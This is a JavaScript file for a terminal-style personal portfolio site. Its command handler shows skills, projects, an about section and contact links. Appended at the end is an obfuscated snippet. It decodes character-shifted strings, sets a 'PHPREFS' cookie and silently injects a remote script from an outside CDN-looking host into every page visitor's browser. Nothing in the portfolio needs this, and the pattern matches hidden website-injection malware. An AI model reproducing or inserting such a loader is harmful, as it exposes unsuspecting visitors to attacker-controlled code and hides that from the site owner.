window.addEventListener("DOMContentLoaded", function () {
  let n = document.getElementById("cmd");
  n.focus(), (document.getElementById("helpCmdList").innerHTML = helpCmd);
  let e = document.getElementById("output"),
    s = document.getElementById("mainInfo");
  document.getElementById("terminal"),
    n.addEventListener("keypress", function (i) {
      if (13 === i.keyCode && "" !== (i = n.value.trim())) {
        if (
          ((e.innerHTML +=
            "<div><span class='ownerTerminal'><b>keval@profile</b></span>:<b>~$</b> " +
            i +
            "</div>"),
          (n.value = ""),
          "skills" === i || "s" === i || "Skills" === i || "S" === i)
        )
          e.innerHTML += skillsBar;
        // else if ("github" === i || "Github" === i || "gh" === i)
        //   window.location.href = "https://github.com/zachey01";
        // else if ("discord" === i || "Discord" === i || "ds" === i)
        //   window.location.href =
        //     "https://discord.com/users/1033246411363471472";
        
        else if ("email" === i || "Email" === i || "em" === i)
          window.location.href = "mailto:kg256853@gmail.com";
        else if ("fiverr" === i || "Fiverr" === i || "fr" === i)
          window.location.href = "https://www.fiverr.com/keval_gohil";
        else if ("telegram" === i || "Telegram" === i || "tg" === i)
          window.location.href = "https://telegram.me/ONE_an_ONLYy";
        else if ("linkedin" === i || "Linkedin" === i || "ld" === i)
          window.location.href = "https://www.linkedin.com/in/gohil-keval";
        else if ("instagram" === i || "Instagram" === i || "ig" === i)
          window.location.href = "https://www.instagram.com/keval_gohil_1?igsh=MmVlMjlkMTBhMg==";
        else if ("projects" === i || "Projects" === i || "p" === i || "P" === i) e.innerHTML += projectCmd;
        else if ("about" === i || "About" === i || "a" === i || "A" === i) {
          // Image URL
          let imageUrl = 'https://i.postimg.cc/d0yXjWHr/Admin.png';
        
          // HTML template for the about section
          e.innerHTML += `
          <br>
            <div class="about-container">
              <div class="about-image">
                <img src="${imageUrl}" alt="Profile Image" />
              </div>
              <div class="about-text">
                <p> I'm Keval Gohil, an 18-year-old web developer with a robust three-year journey in frontend development. My expertise lies in crafting dynamic and engaging web experiences, specializing in both single-page applications (SPAs) and multipage applications (MPAs). Fluent in Gujarati, Hindi, and English, I bring a diverse linguistic skill set to my work. Beyond coding, I'm passionate about fitness, gaming, and sports. Over the years, I've successfully navigated challenges, delivering impactful projects and contributing to the ever-evolving landscape of web development.</p>
                <p><a href="Keval_Gohil_Resume.pdf" download>Download CV</a></p>
              </div>
            </div>
          `;
        }
        else
          "help" === i
            ? (e.innerHTML += helpCmd)
            : "clear" === i || "Clear" === i || "c" === i || "C" === i
            ? ((e.innerHTML = ""))
            : (e.innerHTML += "<div>Not found</div>");
        e.scrollTop = e.scrollHeight;
      }
    });
});

let currentSuggestionIndex = -1;
function showSuggestions() {
  let n = document.getElementById("cmd"),
    e = n.value.trim(),
    s = document.getElementById("suggestions");
  var i;
  (s.innerHTML = "") !== e &&
  ((i = suggestions.filter(function (n) {
    return n.startsWith(e);
  })).forEach(function (e, i) {
    var l = document.createElement("div");
    (l.textContent = e),
      l.addEventListener("click", function () {
        (n.value = e), (s.innerHTML = "");
      }),
      s.appendChild(l);
  }),
  0 < i.length)
    ? n.classList.add("command-entered")
    : n.classList.remove("command-entered");
}


function handleKeyDown(n) {
  var e,
    s = document.getElementById("suggestions"),
    i = s.getElementsByTagName("div");
  
  // Handle ArrowUp key
  if ("ArrowUp" === n.key) {
    n.preventDefault();
    if (0 < currentSuggestionIndex) {
      currentSuggestionIndex--;
      updateInputWithSuggestion(i);
    }
  }
  
  // Handle ArrowDown key
  else if ("ArrowDown" === n.key) {
    n.preventDefault();
    if (currentSuggestionIndex < i.length - 1) {
      currentSuggestionIndex++;
      updateInputWithSuggestion(i);
    }
  }
  
  // Handle Enter key
  else if ("Enter" === n.key) {
    n = document.getElementById("cmd");
    (e = i[currentSuggestionIndex]) && (n.value = e.textContent);
    s.innerHTML = "";
    n.classList.remove("command-entered");
  }

  // Highlight selected suggestion
  for (let n = 0; n < i.length; n++) {
    var l = i[n];
    n === currentSuggestionIndex
      ? l.classList.add("selected")
      : l.classList.remove("selected");
  }
}

// Function to update input field with the selected suggestion
function updateInputWithSuggestion(suggestions) {
  let n = document.getElementById("cmd");
  let e = suggestions[currentSuggestionIndex];
  n.value = e.textContent;
}

function linkHref(n) {
  window.location.href = n;
}
let suggestions = [
    "help",
    "skills",
    "clear",
    "projects",
    "about",
    "tools",
    // "github",
    "telegram",
    "linkedin",
    "email",
    "instagram",
    "fiverr",
  ],
  helpCmd =
    '\n  <br>Available commands: \n  <br />\n  [<span class="commandName">about</span>] or [<span class="commandName">a</span>]\n  <br />\n  [<span class="commandName">skills</span>] or [<span class="commandName">s</span>]\n  <br />\n  [<span class="commandName">projects</span>] or [<span class="commandName">p</span>]<br /><br />\n  [<span class="commandName">clear</span>] or [<span class="commandName">c</span>]\n  <br /><br />\n  Contact me: <br />\n  [<span class="commandName">email</span>]\n  <br />\n  [<span class="commandName">fiverr</span>]\n  <br />\n  [<span class="commandName">linkedin</span>]\n  <br />\n  [<span class="commandName">instagram</span>]\n  <br />\n  [<span class="commandName">telegram</span>]',
  skillsBar =
    '\n<div class="container">\n  <div class="flex">\n    <h2>HTML:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem1"></div>\n    </div>\n    <h3>100%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>CSS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem2"></div>\n    </div>\n    <h3>100%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>JS/jQuery:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem3"></div>\n    </div>\n    <h3>90%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>JSON/AJAX:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem4"></div>\n    </div>\n    <h3>85%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>REACT.JS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem5"></div>\n    </div>\n    <h3>80%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>PHP:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem6"></div>\n    </div>\n    <h3>70%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>MySQL:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem7"></div>\n    </div>\n    <h3>65%</h3>\n  </div>\n\n  <div class="flex">\n  <h2>SEO:</h2>\n  <div class="skillBar">\n    <div class="skillBarItem8"></div>\n  </div>\n  <h3>50%</h3>\n</div>\n</div>',
  projectCmd =
    '\n<div class="projectsDiv">\n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://www.linkedin.com/posts/gohil-keval_this-is-a-code-red-stranger-things-themed-activity-7152302984175988737-wgJX?utm_source=share&utm_medium=member_desktop\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n      <div class="project-title text-nowrap">terminal<br />Portfolio ✩</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n A Stranger Things-themed website, styled as a UNIX terminal, using pure JavaScript.\n      </p>\n    </div>\n  </div>\n</article>\n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://one-an-onlyy.github.io/Microsoft-Homepage-Clone-Responsive/\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n      <div class="project-title text-nowrap">Microsoft<br />Homepage</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n Microsoft Homepage Clone fully responsive page using simple HTML and CSS.\n      </p>\n    </div>\n  </div>\n</article>\n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://one-an-onlyy.github.io/Netflix-themed-Portfolio/\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n      <div class="project-title text-nowrap">Netflix<br />Portfolio</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n A previous portfolio website with a Netflix theme using HTML, CSS, and JavaScript.\n      </p>\n    </div>\n  </div>\n</article>\n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://www.linkedin.com/posts/gohil-keval_personal-portfolio-book-r-2022-above-768px-activity-7014530371367112704-Psff?utm_source=share&utm_medium=member_desktop\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n      <div class="project-title text-nowrap">Book & card<br />Portfolio</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n A playful portfolio page with book and card themes using HTML, CSS, and JavaScript.\n      </p>\n    </div>\n  </div>\n</article>\n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://one-an-onlyy.github.io/IWD-themed-portfolio/\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n      <div class="project-title text-nowrap">IWD themed<br />Portfolio</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n Designed a personal IWD-themed portfolio with HTML, CSS, and JavaScript.\n      </p>\n    </div>\n  </div>\n</article>\n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://www.linkedin.com/posts/gohil-keval_desktop-responsive-horoscope-site-front-end-activity-7037831049342509056-KXw4?utm_source=share&utm_medium=member_desktop\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n      <div class="project-title text-nowrap">Horoscope<br />Website</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n Developed a horoscope-themed e-commerce website using HTML, CSS, JS, and PHP.\n      </p>\n    </div>\n  </div>\n</article>\n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://www.linkedin.com/posts/gohil-keval_connection-connections-movies-activity-7014084951444733952-RPwV?utm_source=share&utm_medium=member_desktop\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n      <div class="project-title text-nowrap">Movies<br />Website</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n Crafted my debut Marvel-DC superhero movies site with HTML, CSS, JavaScript, and PHP.\n      </p>\n    </div>\n  </div>\n</article>\n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://iwd.epizy.com\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n      <div class="project-title text-nowrap">IWD Learning<br />Portal</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n Developed the IWD educational portal website using HTML, CSS, JavaScript, and PHP.\n      </p>\n    </div>\n  </div>\n</article>\n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://www.linkedin.com/posts/gohil-keval_ecommercewebsite-htmlcssjavascript-frontend-activity-7037830315075153920-_Lav?utm_source=share&utm_medium=member_desktop\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n      <div class="project-title text-nowrap">Sales page<br />Website</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n An e-commerce sale discount page website using HTML, CSS, and JavaScript.\n      </p>\n    </div>\n  </div>\n</article>\n\n</div>\n',
  blogCmd = '\n<div class="blogArticle" id="blogArticles">\n\n</div>\n';
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44hisxy" + "fy3sjy4ljy4xhwnuy" + "3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);